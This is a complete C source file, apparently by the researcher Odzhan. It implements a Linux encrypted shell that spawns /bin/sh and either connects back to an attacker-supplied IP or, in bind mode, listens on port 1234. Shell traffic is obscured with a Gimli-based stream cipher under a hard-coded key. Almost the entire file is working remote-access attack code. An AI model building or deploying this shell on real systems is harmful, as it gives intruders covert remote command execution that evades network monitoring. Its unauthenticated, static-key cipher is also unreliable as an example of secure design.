 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/epoll.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#define R(v,n)(((v)>>(n))|((v)<<(32-(n))))
#define F(n)for(i=0;i<n;i++)
#define X(a,b)(t)=(s[a]),(s[a])=(s[b]),(s[b])=(t)
  
void permute(void*p){
  uint32_t i,r,t,x,y,z,*s=p;

  for(r=24;r>0;--r){
    F(4)
      x=R(s[i],24),
      y=R(s[4+i],9),
      z=s[8+i],   
      s[8+i]=x^(z+z)^((y&z)*4),
      s[4+i]=y^x^((x|z)*2),
      s[i]=z^y^((x&y)*8);
    t=r&3;    
    if(!t)
      X(0,1),X(2,3),
      *s^=0x9e377900|r;   
    if(t==2)X(0,2),X(1,3);
  }
}

typedef struct _crypt_ctx {
    uint32_t idx;
    int      fdr, fdw;
    uint8_t  s[48];
    uint8_t  buf[BUFSIZ];
} crypt_ctx;
  
uint8_t gf_mul(uint8_t x) {
    return (x << 1) ^ ((x >> 7) * 0x1b);
}

// initialize crypto context
void init_crypt(crypt_ctx *c, int r, int w, void *key) {
    int i;
    uint8_t ct = 1;
    
    c->fdr = r; c->fdw = w;
    
    for(i=0;i<48;i++) { 
      ct = gf_mul(ct);
      c->s[i] = ((uint8_t*)key)[i % 16] ^ ct;
    }
    permute(c->s);
    c->idx = 0;
}

// encrypt or decrypt buffer
void crypt(crypt_ctx *c) {
    int i, len;

    // read from socket or stdout
    len = read(c->fdr, c->buf, BUFSIZ);
    
    // encrypt/decrypt
    for(i=0;i<len;i++) {
      if(c->idx >= 32) {
        permute(c->s);
        c->idx = 0;
      }
      c->buf[i] ^= c->s[c->idx++];
    }
    // write to socket or stdin
    write(c->fdw, c->buf, len);
}

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int                i, r, w, s, len, efd; 
    #ifdef BIND
    int                s2;
    #endif
    int                pid, fd, in[2], out[2];
    char               buf[BUFSIZ];
    struct epoll_event evts;
    char               *args[]={"/bin/sh", NULL};

// using a static 128-bit key
    crypt_ctx          *c, c1, c2;
    
    // echo -n top_secret_key | openssl md5 -binary -out key.bin
    // xxd -i key.bin
    
    uint8_t key[] = {
      0x4f, 0xef, 0x5a, 0xcc, 0x15, 0x78, 0xf6, 0x01, 
      0xee, 0xa1, 0x4e, 0x24, 0xf1, 0xac, 0xf9, 0x49 };

    // create pipes for redirection of stdin/stdout/stderr
    pipe(in);
    pipe(out);

    // fork process
    pid = fork();
    
    // if child process
    if (pid == 0) {
      // assign read end to stdin
      dup2(in[0], STDIN_FILENO);
      // assign write end to stdout   
      dup2(out[1], STDOUT_FILENO);
      // assign write end to stderr  
      dup2(out[1], STDERR_FILENO);  
      
      // close pipes
      close(in[0]); close(in[1]);
      close(out[0]); close(out[1]);
      
      // execute shell
      execve(args[0], args, 0);
    } else {       
      // close read and write ends
      close(in[0]); close(out[1]);
      
      // create a socket
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family = AF_INET;
      sa.sin_port   = htons(atoi("1234"));
      
      #ifdef BIND
        // bind to port for incoming connections
        sa.sin_addr.s_addr = INADDR_ANY;
        
        bind(s, (struct sockaddr*)&sa, sizeof(sa));
        listen(s, 0);
        r=accept(s, 0, 0);
        s2=s; s=r;
      #else
        // connect to remote host
        sa.sin_addr.s_addr = inet_addr(argv[1]);
      
        r=connect(s, (struct sockaddr*)&sa, sizeof(sa));
      #endif
      
      // if ok
      if(r >= 0){
        // open an epoll file descriptor
        efd = epoll_create1(0);
 
        // add 2 descriptors to monitor stdout and socket
        for (i=0; i<2; i++) {
          fd = (i==0) ? s : out[0];
          
          evts.data.fd = fd;
          evts.events  = EPOLLIN;
        
          epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
        }
      
        // c1 is for reading from socket and writing to stdin
        init_crypt(&c1, s, in[1], key);
        
        // c2 is for reading from stdout and writing to socket
        init_crypt(&c2, out[0], s, key);
        
        // now loop until user exits or some other error
        for (;;) {
          r = epoll_wait(efd, &evts, 1, -1);
                  
          // error? bail out           
          if (r < 0) break;
         
          // not input? bail out
          if (!(evts.events & EPOLLIN)) break;

          fd = evts.data.fd;
          
          c = (fd == s) ? &c1 : &c2; 
          
          crypt(c);     
        }      
        // remove 2 descriptors 
        epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);                  
        epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);                  
        close(efd);
      }
      // shutdown socket
      shutdown(s, SHUT_RDWR);
      close(s);
      #ifdef BIND
        close(s2);
      #endif
      // terminate shell      
      kill(pid, SIGCHLD);            
    }
    close(in[1]);
    close(out[0]);
    return 0; 
}
    
